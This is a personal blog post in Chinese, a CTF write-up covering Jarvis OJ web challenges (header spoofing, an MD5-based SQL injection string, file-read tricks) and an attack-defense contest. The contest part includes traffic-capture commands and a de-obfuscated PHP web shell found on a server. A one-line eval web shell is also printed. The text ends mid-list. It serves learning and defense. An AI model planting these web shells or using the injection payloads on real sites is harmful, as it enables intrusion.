<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="ä¸ªäººåšå®¢|è®¡ç®—æœº">
    

    <!--Author-->
    
        <meta name="author" content="youjianing --TJU">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="CTF writeup">
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="ä¸ªäººåšå®¢|è®¡ç®—æœº">
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="é—¹é’Ÿä½ åˆ«é—¹">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>CTF writeup - é—¹é’Ÿä½ åˆ«é—¹</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2019/07/07/CTF-writeup/">
                CTF writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-07</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <p><a href="http://whoisyourdaddy.cf" target="_blank" rel="noopener"><font size="5" color="blue">é¦–é¡µ</font> </a></p>
<p>#CTF WriteUP<br><font size="4" color="red" face="æ¥·ä½“">Made By YJN</font></p>
<p><img src="http://whoisyourdaddy.cf/picture/640.gif" alt></p>
<div>
<br><br><br><br>
<font size="2" color="green">
éƒ½æ˜¯èœé¸¡æ€»ç»“çš„ä¸€ç‚¹å¸¸è¯†, å¤§ä½¬è¯·ç»•è·¯(å‘æŠ–)<br>
ä½†æ˜¯ä¹Ÿæ¬¢è¿å¤§ä½¬çº æ­£é”™è¯¯, æ‰¹è¯„æŒ‡å¯¼<br>
èœé¸¡ä¸èƒœæ„Ÿæ¿€<br>
</font>
</div>
<br>
[toc]
##WEB
###[localhost](http://web.jarvisoj.com:32774/)(resolved)

<p>é¢˜ç›®ä¸­åªæœ‰ä¸€è¡Œ <strong>localhost access only!!</strong><br><a href="https://link.jianshu.com/?t=http://www.111cn.net/phper/php-cy/59523.htm" target="_blank" rel="noopener">PHPè·å–ç”¨æˆ·IPåœ°å€</a><br>æ‰€ä»¥éœ€è¦ä¼ªé€ è‡ªå·±çš„IPåœ°å€<br>ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯åœ¨HTTPçš„è¯·æ±‚å¤´ä¸­æ·»åŠ å‚æ•°:<code>X-Forwarded-For : éœ€è¦ä¼ªé€ çš„IP</code><br>å¯ä»¥ä½¿ç”¨burp suiteæŠ“åŒ…æˆ–PostManæ¥å®ç°<br><img src="http://whoisyourdaddy.cf/picture/X-Forwarded-For.png" alt><br>ç±»ä¼¼çš„, å¯ä»¥ä¼ªé€ <code>Referer</code><br><code>Referer</code>è¡¨æ˜äº†ç”¨æˆ·æ˜¯ä»å“ªä¸ªé¡µé¢è·³è½¬æ¥çš„.<br>ä¾‹å¦‚<br><code>Referer: https://www.google.com</code></p>
<p>###<a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">admin</a>(resolved)</p>
<p>è¿›å…¥ç½‘é¡µåªæœ‰ä¸€ä¸ªhello world<br>æŸ¥çœ‹ç½‘é¡µä»£ç ,æ²¡æœ‰çº¿ç´¢<br>å°è¯•robots.txt,ç½‘é¡µè·³è½¬,ä½†æ˜¯å‡ºç°äº†ä¸€ä¸ªå‡flag<br>burp suiteæŠ“åŒ…, ä¿®æ”¹å‚æ•°admin = 1,followåå‡ºç°çœŸçš„flag</p>
<p>###<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">login</a>(working)</p>
<p>è¿›å…¥é¢˜ç›®åªæœ‰ä¸€ä¸ªç™»é™†æ¡†ï¼Œ<br>å³é”®æºç ï¼Œå‘ç°å¯†ç æ ¡éªŒä¸åœ¨æœ¬åœ°ï¼Œ<br>ä½¿ç”¨BurpSuiteåœ¨åå°å¯†ç çˆ†ç ´ï¼Œ<br>åŒæ—¶å°è¯•ä½¿ç”¨ sql æ³¨å…¥<br>è¾“å…¥ <code>1&#39;or&#39;1&#39;or&#39;1</code>,<br>å¾—åˆ°ä¸€ä¸ªå¥‡æ€ªçš„å“åº”,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /opt/lampp/htdocs/index.php on line 14</span><br><span class="line">Wrong Password.</span><br></pre></td></tr></table></figure>

<p>æ­£å½“ç™¾æ€ä¸å¾—å…¶è§£æ—¶,<br>æŸ¥çœ‹ä¸‹çˆ†ç ´æ—¶çš„ response åŒ…,ç«Ÿç„¶æœ‰æç¤º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>

<p>å…³äºmd5(string,raw)å‡½æ•°:</p>
<ul>
<li>stringå¿…éœ€, è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²</li>
<li>rawå¯é€‰, è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼(TRUEæˆ–FALSE)</li>
</ul>
<p>2019/7/4æ—¥ è¡¥å……:<br>åŸæ¥hinté‡Œå·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†, å°±æ˜¯å…ˆæŠŠæˆ‘ä»¬çš„å‚æ•°md5åŠ å¯†åå†æ‰§è¡ŒæŸ¥è¯¢.<br>å¦‚æœæˆ‘ä»¬æƒ³æ„é€ payload, éœ€è¦ä½¿ md5($pass,true) çš„ç»“æœä¸­å‡ºç° <code>&#39;or&#39;</code> , æ‰å¯èƒ½ç»•è¿‡.<br>é’ˆå¯¹è¿™ä¸ªé—®é¢˜, å·²ç»æœ‰äº†ç°æˆçš„payload â€“ <code>ffifdyop</code><br>è¿™æ˜¯å› ä¸º :<br>MD5(â€˜ffifdyopâ€™) =&gt; <code>276f722736c95d99e921722cf9ed621c</code>  #md5åŠ å¯†<br><code>276f722736c95d99e921722cf9ed621c</code> =&gt;  â€˜orâ€™6&lt;ä¹±ç &gt;     #è½¬ä¸ºå­—ç¬¦ä¸²</p>
<p>###<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">ç¥ç›¾å±€çš„ç§˜å¯†</a>(working)<br>è¿›å…¥é¢˜ç›®, åœ¨å¼€å‘è€…å·¥å…·ä¸­å‘ç°æœ‰ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>ä¼ ç»™imgçš„å‚æ•°æ˜¯è¢«base64åŠ å¯†è¿‡äº†,<br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³åˆ©ç”¨è¿™ä¸ªå‚æ•°æäº‹,ä¹Ÿå¿…é¡»å…ˆç”¨base64åŠ å¯†</p>
<p>é¦–å…ˆå¯¹ <code>index.php</code> åŠ å¯†å¾—åˆ° <code>aW5kZXgucGhw</code><br>å°†å®ƒä½œä¸ºå‚æ•°ä¼ ç»™URL:<br><code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code><br>è¿”å›çš„é¡µé¢ä¸­æœ‰ä»£ç  :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶ä»urlä¸­çœ‹å‡ºæœ‰ä¸ªæ–‡ä»¶åå­—å«<code>showimg.php</code>, ä»¥åŒæ ·çš„æ–¹æ³•å°†å…¶ä½œä¸ºå‚æ•°,è®¿é—®url:<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</code><br>ä¹Ÿæœ‰ä»£ç  :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œæš‚æ—¶è¿˜ä¸æ‡‚ä»£ç çš„é€»è¾‘, å›æ¥å†è¯´</p>
<p>###<a href="http://web.jarvisoj.com:32780/index.phps" target="_blank" rel="noopener">IN A MESS</a>(working)<br>è¿›å…¥é¢˜ç›®åªæœ‰ä¸€å¥ <code>work harder!harder!harder!</code><br>è§‚å¯Ÿurlæœ‰ä¸ªå‚æ•°id,ä¸ç®¡æ€æ ·,<br>å…ˆåå°çˆ†ç€å†è¯´.<br>ç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨.<br>çœ‹responseåŒ…é‡Œ,æœ‰ä¸ªindex.phps <em>ä¸€å¼€å§‹æˆ‘æ ¹æœ¬æ²¡çœ‹å‡ºæ¥å’Œindex.phpä¸ä¸€æ ·</em> :/<br>è®¿é—®,æœ‰å¦‚ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ payloadæ¯”è¾ƒå¤æ‚, å›å†è¯´å§</p>
<p><a href="https://www.cnblogs.com/baifan2618/p/7815090.html" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<p>###<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">PORT51</a>(resolved)<br>æ ¹æ®é¢˜ç›®, åº”è¯¥æ˜¯éœ€è¦ä»¥æŒ‡å®šçš„51ç«¯å£è®¿é—®.<br>åœ¨æœ¬åœ°cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>

<p>å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨, å¾—åˆ°çš„å“åº”å’Œåœ¨æµè§ˆå™¨ä¸Šæ²¡åŒºåˆ«,<br>ä½†æ˜¯ä½¿ç”¨æœåŠ¡å™¨, è¾“å…¥åŒæ ·çš„å‘½ä»¤å¯ä»¥æˆåŠŸ, æš‚æ—¶å­˜ç–‘<br>åæ­£,<br>flag æ‹¿åˆ°äº†å¯¹å§ :(</p>
<p>###TSCTF(resolved)</p>
<p><img src="http://whoisyourdaddy.cf/picture/TSCTF.jpeg" alt></p>
<p>è¿™åº”è¯¥ç®—æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‚è§æ¯”è¾ƒæ­£å¼çš„CTFçº¿ä¸‹èµ›å§</p>
<p>èƒ½å¾—å¥–åŸºæœ¬å°±æ˜¯é æŠ±å¤§è…¿</p>
<p>æ²¡ä»€ä¹ˆæƒ³å¤šè¯´çš„</p>
<p>åªå¸Œæœ›æ˜å¹´è¿™å¤©</p>
<p>æˆ‘æ˜¯D.I.Eçš„ä¸»åŠ›</p>
<p>####æµé‡ç›‘å¬</p>
<p>æ‰“ç®—åœ¨æ¯”èµ›æ—¶å¯ä»¥é€šè¿‡ç›‘å¬å·¥å…·,æŠ“å–è‡ªå®¶æœåŠ¡å™¨çš„æµé‡,<br>å°±ç®—é¢˜ç›®æ²¡æœ‰å¤´ç»ª, è¿˜å¯ä»¥åˆ†æä¸€æ³¢åˆ«äººçš„ payload.</p>
<p><strong>tshark</strong><br>éœ€è¦å…ˆè‡ªè¡Œå®‰è£…ä¸€ä¸‹.<br><strong>åŸºæœ¬æ¯ä¸ªå‘½ä»¤éƒ½éœ€è¦rootæƒé™<code>sudo</code></strong></p>
<ul>
<li>æ˜¾ç¤ºå¯ç”¨ç½‘å¡ <code>tshark -D</code></li>
<li>æŠ“åŒ…  ä½¿ç”¨å‘½ä»¤ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [æ•°å­—]  -w [æ–‡ä»¶å.pcap] -f [æ•è·è¿‡æ»¤å™¨]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c è¡¨ç¤ºæŠ“å¤šå°‘åŒ…ååœæ­¢</span><br><span class="line">+ -w æŠŠæŠ“åŒ…ç»“æœè¾“å…¥åˆ°æ–‡ä»¶ä¸­, æ— éœ€æå‰åˆ›å»º, è‹¥ç›®å½•ä¸‹æ²¡æœ‰, è‡ªåŠ¨åˆ›å»º</span><br><span class="line">+ -f è®¾ç½®æ•è·è¿‡æ»¤å™¨, æˆ‘ä»¬æ­¤å¤„ä¸»è¦é’ˆå¯¹httpçš„æ•°æ®åŒ…, æ‰€ä»¥å‚æ•°è®¾å®šä¸º &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯æ ¹æ®æˆ‘çš„è¯•éªŒ, å‡¡æ˜¯ä½¿ç”¨tsharkåäº§ç”Ÿçš„æ–‡ä»¶æƒé™éƒ½ååˆ†æ•æ„Ÿ, æ²¡æ³•ç”¨finalshell ç›´æ¥ä¸‹è½½, ä¸ºäº†æ–¹ä¾¿èµ·è§, å†è¡¥å……ä½¿ç”¨ tcpdump çš„æ–¹æ³•</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>tcpdump -s  [æ•°å­—]  -w [æ–‡ä»¶.pcap] port [ç«¯å£æ•°]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+ -s è¡¨ç¤ºä¸€ä¸ªåŒ…æˆªæ–­çš„é•¿åº¦, 0è¡¨ç¤ºä¸æˆªæ–­, å®Œæ•´çš„ä¿å­˜ä¸‹æ¥</span><br><span class="line">+ -w è¾“å…¥åˆ°æ–‡ä»¶</span><br><span class="line">+ port ç›‘å¬çš„ç«¯å£</span><br><span class="line"></span><br><span class="line">**ä½¿ç”¨ tcpdump åŒæ ·éœ€è¦sudo**</span><br><span class="line">ç„¶è€Œè¿™åœºæ¯”èµ›æ²¡æœ‰rootæƒé™, è‡ªç„¶ä¹Ÿå°±æ²¡æ³•ç”¨sudo, æˆ‘, , ,</span><br><span class="line"></span><br><span class="line">####è‡ªåŠ¨æäº¤ flag çš„ python è„šæœ¬</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def submit(flag, token):                           # å®šä¹‰å‡½æ•° submit</span><br><span class="line">	url = &quot;wangzhi&quot;                            # éœ€è¦è®¾ç½®çš„å‚æ•°  url</span><br><span class="line">	pos = &#123;                                    # å­—å…¸ï¼Œpythonçš„ä¸€ç§å¯å˜å®¹å™¨æ¨¡å‹</span><br><span class="line">	    &quot;flag&quot;:flag,</span><br><span class="line">	    &quot;token&quot;:token</span><br><span class="line">	&#125;                                          # æ‰€ä»¥ pos[&quot;flag&quot;] = flag</span><br><span class="line">	print &quot;[+] Submiting flag : [%s]&quot; % (pos)  # æ ¼å¼åŒ–è¾“å‡º pos</span><br><span class="line">	response = requests.post(url,data=pos)     # response æ¥æ”¶ request.post()è¿”å›çš„å¯¹è±¡(?),å…¶æœ‰è®¸å¤šæ•°æ®åŸŸ</span><br><span class="line">	content = response.content                 # content æ¥æ”¶ responseçš„æ•°æ®åŸŸcontent, äºŒè¿›åˆ¶æ•°æ®</span><br><span class="line">	print &quot;[+] Content : %s &quot; % (content)      # æ ¼å¼åŒ–è¾“å‡ºcontent</span><br><span class="line">	if failed in content:                      # è‹¥æˆåŠŸæäº¤, è¿”å›True,åä¹‹è¿”å›False</span><br><span class="line">		print &quot;[-]failed&quot;</span><br><span class="line">		return False</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[+] Success!&quot;            </span><br><span class="line">		return True</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œç›®å‰æˆ‘çš„pythonç¯å¢ƒè¿˜æœ‰ç‚¹é—®é¢˜, æš‚æ—¶æ²¡æ³•æ­£å¸¸è¿è¡Œ<br>è£…äº†python3, åˆè£…python2<br>è£…pythonä¸€æ—¶çˆ½,<br>ä¸€ç›´è£…ä¸€ç›´çˆ½ ğŸ˜­</p>
<p>####ç¬¬ä¸€ä¸ªæ¼æ´</p>
<p>å¼€å±€ç™»é™†è¿›ä¸»æœºå, è¿…é€Ÿä½¿ç”¨ä¸‹è½½æ•´ä¸ªç½‘ç»œç›®å½•åˆ°æœ¬åœ°<br>Dç›¾æ‰«æå‡ºä¸€ä¸ªé«˜å±æ–‡ä»¶!<code>.202cb962ac59075b964b07152d234b70.ini.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="comment">/*-/*-*/</span><span class="string">'e'</span>.<span class="comment">/*-/*-*/</span><span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">'a'</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">'t'</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">'_P'</span>.<span class="comment">/*-/*-*/</span><span class="string">'OS'</span>.<span class="comment">/*-/*-*/</span><span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–‡ä»¶å½“æ—¶æ²¡æœ‰çœ‹æ‡‚ï¼Œä½†æ˜¯ç°åœ¨ç»è¿‡å­¦é•¿çš„æŒ‡ç‚¹æœ‰ç‚¹æ¸…æ™°äº†<br>å…¶å®ä»£ç ä¸­æœ‰ç€å¤§é‡çš„éšœçœ¼æ³•<br>é¦–å…ˆæ˜¯å¤§é‡çš„æ³¨é‡Šï¼ŒæŠŠå®ƒä»¬å»æ‰å</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="string">'e'</span>.<span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="string">'a'</span>.$_.<span class="string">'t'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_P'</span>.<span class="string">'OS'</span>.<span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="number">0</span>+<span class="number">3</span>+<span class="number">3</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…¶å®è¿™é‡Œçœ‹å‡ºä»æœ‰å¾ˆå¤šæ‹¼æ¥è¿ç®—åœ¨é˜»ç¢æˆ‘ä»¬åˆ†æ,<br>æˆ‘ä»¬ç›´æ¥å†™å‡ºæ‹¼æ¥åçš„ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'assert'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_POST'</span>&#125;[<span class="number">6</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹åˆ°,è¿™ä¸¤è¡Œä»£ç ä¸­éƒ½æœ‰å˜é‡<code>$_</code>,<br>èµ·åˆæˆ‘ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆæ„æ€, å…¶å®å°±æ˜¯ç›¸å½“äºæ–‡æœ¬çš„æ›¿æ¢<br>å› ä¸º<code>$_</code>å­˜æ”¾çš„æ˜¯å­—ç¬¦ä¸², æ‰€ä»¥phpçš„è§£é‡Šå™¨åœ¨åˆ†ææ—¶ä¹Ÿä»…ä»…æ˜¯æŠŠå†…å®¹åŸå°ä¸åŠ¨çš„æ”¾åœ¨è¿™é‡Œ<br>é‚£ä¹ˆè¿™æ®µä»£ç å°±æ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_POST[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€Œä¸€å¥è¯æœ¨é©¬<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>å…¶ä¸­assert()å’Œeval()çš„æ•ˆæœç±»ä¼¼<br>æ‰€ä»¥è¿™ä¸ªæ–‡ä»¶é‡Œå°±æ˜¯æš—è—ä¸€å¥è¯æœ¨é©¬!</p>
<p>####ä¸€å¥è¯æœ¨é©¬çš„åŸç†<br>ä¹‹å‰ä½¿ç”¨ä¸€å¥è¯æœ¨é©¬ä¹Ÿæœ‰å¥½å‡ æ¬¡äº†,<br>ä½†æ˜¯åŸºæœ¬éƒ½æ˜¯ç”¨èœåˆ€ç›´è¿, å´å¯¹å®ƒçš„åŸç†ä¸ç”šäº†è§£.<br>å€Ÿè¿™ä¸ªæœºä¼šèµ¶ç´§æŠŠphpçš„ä¸€äº›ç»†èŠ‚ä¸Šçš„ä¸œè¥¿ææ¸…æ¥š.</p>
<p>å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
